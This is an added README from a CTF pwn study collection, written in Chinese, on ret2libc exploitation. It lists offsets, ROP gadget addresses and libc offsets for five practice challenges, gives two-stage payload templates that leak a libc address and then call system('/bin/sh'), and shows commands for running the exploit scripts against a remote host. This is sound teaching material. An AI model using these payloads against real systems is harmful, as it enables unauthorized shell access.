@@ -1,0 +1,177 @@
+# ret2libc
+
+> 共同模式特征：**栈溢出 + leak libc 地址 + 返回到 libc 函数**
+> 二进制本身没有 `system@plt`，但通常有 `puts@plt` / `write@plt` 和对应 GOT。
+> 利用分两阶段：先 leak，再回 `main` 或重新触发输入，最后 `system("/bin/sh")`。
+
+---
+
+## 1. 模式特征
+
+```text
+存在无边界输入（read / gets 等）
++ 可覆盖 saved RIP
++ 通常 No canary + No PIE（13 是 canary 例外）
++ 二进制没有 system@plt
++ 有 puts@plt + puts@got（或 write 等）
+= ret2libc
+```
+
+标准流程：
+
+1. `file` / `checksec`：确认位数、PIE、Canary、NX、RELRO。
+2. `nm` / `objdump`：确认没有 `system@plt`，但有 `puts@plt`、`puts@got`。
+3. 反汇编漏洞函数：算 buffer 到 saved RIP 的偏移。
+4. 找 `pop rdi; ret` 和 bare `ret` gadget。
+5. Stage 1：`puts(puts@got)` leak，末尾返回 `main`。
+6. 用 leak 算 libc base，Stage 2：`system("/bin/sh")`。
+7. 64 位下注意 `system` / `puts` 的 16 字节栈对齐。
+
+---
+
+## 2. 本模式题目
+
+| 题目 | 架构 / 链接 | 输入点 | 偏移 | Stage 1 | Stage 2 |
+| --- | --- | --- | --- | --- | --- |
+| `07_newstarctf_2023_ret2libc` | amd64 / 动态 / not stripped | `read(0, buf, 0x100)`，`buf=rbp-0x20` | **40** | leak `puts@got`，返回 `main` | `system("/bin/sh")` |
+| `10_jarvisoj_level4` | i386 / 动态 / not stripped | `read(0, buf, 0x100)`，`buf=ebp-0x88` | **140** | `write(1, write@got, 4)`，返回 `main` | `system("/bin/sh")` |
+| `11_2018_rop` | i386 / 动态 / not stripped | `read(0, buf, 0x100)`，`buf=ebp-0x88` | **140** | `write(1, write@got, 4)`，返回 `main` | `system("/bin/sh")` |
+| `12_bjdctf_2020_babyrop` | amd64 / 动态 / not stripped | `read(0, buf, 0x64)`，`buf=rbp-0x20` | **40** | leak `puts@got`，返回 `main` | `system("/bin/sh")` |
+| `13_putsorsys` | amd64 / 动态 / not stripped | menu + `read(0, buf, 0x100)`，canary | **0x38**（canary 0x28） | `%13$p` leak canary，`%9$s` leak `puts@got` | 保留 canary 后 `system("/bin/sh")` |
+
+关键地址：
+
+| 题目 | 关键符号 / gadget |
+| --- | --- |
+| `07_newstarctf_2023_ret2libc` | `puts@plt=0x400520`、`puts@got=0x601018`、`pop rdi=0x400763`、`ret=0x400506`、`main=0x400698` |
+| `10_jarvisoj_level4` | `write@plt=0x8048340`、`write@got=0x804A018`、`main=0x8048470` |
+| `11_2018_rop` | `write@plt=0x80483A0`、`write@got=0x804A010`、`main=0x80484C6` |
+| `12_bjdctf_2020_babyrop` | `puts@plt=0x4004E0`、`puts@got=0x601018`、`pop rdi=0x400733`、`ret=0x4004C9`、`main=0x4006AD` |
+| `13_putsorsys` | `puts@got=0x404018`、`/bin/sh=0x40205E`、`pop rdi=libc+0x2A3E5`、`ret=libc+0x29CD6` |
+
+Payload 核心：
+
+```python
+# 64 位，puts leak（07 / 12）
+# Stage 1
+b"A" * OFFSET + p64(RET) + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(RET) + p64(MAIN)
+
+# Stage 2
+b"A" * OFFSET + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
+
+# 32 位，write leak（10 / 11）
+# Stage 1
+b"A" * OFFSET + p32(WRITE_PLT) + p32(MAIN) + p32(1) + p32(WRITE_GOT) + p32(4)
+
+# Stage 2
+b"A" * OFFSET + p32(SYSTEM) + p32(0xDEADBEEF) + p32(BINSH)
+```
+
+---
+
+## 3. 关键坑点
+
+1. **leak 前先吃掉 `See you next time`**
+   `main` 在 `read` 后、`ret` 前还会 `puts("See you next time")`。
+   第一行不是 leak；先 `recvuntil` 这一行，再读 6 字节地址。
+
+2. **leak 是 6 字节**
+   `puts` 打印到 NUL 为止，64 位地址通常只有 6 个有效字节。
+   用 `recvline().strip().ljust(8, b"\x00")`，不要死等 8 字节。
+
+3. **Stage 1 必须返回 `main`**
+   第二阶段需要重新触发同一个 `read`。
+   如果 Stage 1 直接退出，就没有第二次溢出。
+
+4. **64 位对齐要补 `ret`**
+   Stage 1 的 `ret` 对齐 `puts`，末尾 `ret` 对齐 `main` 重入；
+   Stage 2 的 `ret` 对齐 `system`。
+
+5. **`pop rdi; ret` 可能是非对齐 gadget**
+   本题在 `0x400763`，是 `pop r15; ret` 中间的 `5f c3`。
+   用 `ROPgadget` 或 `ROP(e).find_gadget(["pop rdi", "ret"])` 找，不要只盯着函数符号。
+
+6. **libc 不对就不要硬打**
+   检查 `libc_base & 0xfff == 0`。
+   优先用题目附件 libc，设置 `LIBC=/path/to/libc.so.6`。
+   原题按 Ubuntu 18.04 构建时，`libc6 2.27-3ubuntu1.6` 的偏移是：
+   `puts=0x080970`、`system=0x04f420`、`/bin/sh=0x1b3d88`。
+
+---
+
+## 4. 文件说明
+
+| 文件 | 作用 |
+| --- | --- |
+| `07_newstarctf_2023_ret2libc_speedrun.md` | 2 分钟速通：偏移、gadget、两阶段布局、libc 识别 |
+| `07_newstarctf_2023_ret2libc_exp.py` | 武器化 EXP：LOCAL 用本机 libc，远程可 `LIBC=` 指定 |
+| `10_jarvisoj_level4_speedrun.md` / `10_jarvisoj_level4_exp.py` | 32 位 `write` leak 模板 |
+| `11_2018_rop_speedrun.md` / `11_2018_rop_exp.py` | 32 位 `write` leak 模板（同 10，地址不同） |
+| `12_bjdctf_2020_babyrop_speedrun.md` / `12_bjdctf_2020_babyrop_exp.py` | 64 位 `puts` leak + `ret` 对齐 |
+| `13_putsorsys_speedrun.md` / `13_putsorsys_exp.py` | 格式化字符串 leak canary/puts + canary-safe ROP |
+| `[NewStarCTF 2023 公开赛道]ret2libc` | 07 的题目二进制 |
+| `jarvisoj_level4` | 10 的题目二进制 |
+| `铁人三项（第五赛区）2018_rop` | 11 的题目二进制 |
+| `bjdctf_2020_babyrop` | 12 的题目二进制 |
+| `putsorsys` / `libc.so.6` | 13 的题目二进制与附件 libc |
+
+> 这些题目都没有单独留 `writeup.md`；对应的 `speedrun.md` 已包含完整逆向、栈布局、gadget 与两阶段利用说明。
+
+---
+
+## 5. 使用方式
+
+```bash
+cd '/home/yfhd5/Pwn Writeups/ret2libc'
+
+# 静态确认
+file '[NewStarCTF 2023 公开赛道]ret2libc'
+checksec --file='[NewStarCTF 2023 公开赛道]ret2libc'
+objdump -d -M intel '[NewStarCTF 2023 公开赛道]ret2libc' | sed -n '/<main>:/,/^$/p'
+
+# 本地：用本机 libc 验证 leak + 二阶段
+python 07_newstarctf_2023_ret2libc_exp.py LOCAL
+
+# 远程：明文 TCP
+HOST=target.example.com PORT=9999 python 07_newstarctf_2023_ret2libc_exp.py
+
+# 远程：指定题目 libc
+LIBC=./libc-2.27.so HOST=target.example.com PORT=9999 \
+python 07_newstarctf_2023_ret2libc_exp.py
+
+# 10 / 11：32 位，需要 i386 loader
+I386_LD=/tmp/libc32/root/usr/lib32/ld-linux.so.2 \
+I386_LIBPATH=/tmp/libc32/root/usr/lib32 \
+python 10_jarvisoj_level4_exp.py LOCAL
+I386_LD=/tmp/libc32/root/usr/lib32/ld-linux.so.2 \
+I386_LIBPATH=/tmp/libc32/root/usr/lib32 \
+python 11_2018_rop_exp.py LOCAL
+
+# 12：本机 glibc
+python 12_bjdctf_2020_babyrop_exp.py LOCAL
+
+# 13：附件 libc + 2.35 loader
+LIBC=./libc.so.6 \
+LD_SO=/tmp/libc235/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 \
+LIBC_DIR=. python 13_putsorsys_exp.py LOCAL
+```
+
+CTF² 等 TLS 平台：
+
+```bash
+SSL=1 HOST=target.example.com PORT=9999 \
+python 07_newstarctf_2023_ret2libc_exp.py
+```
+
+---
+
+## 6. 题型识别卡
+
+```text
+read/gets 栈溢出 + No canary + No PIE
++ 没有 system@plt
++ 有 puts@plt / puts@got
+= 先 leak puts，再回 main，最后 system("/bin/sh")
+```
+
+一句话：**Stage 1 只负责 leak 和回 `main`；Stage 2 才打 `system`。别把 `See you next time` 当 leak。**
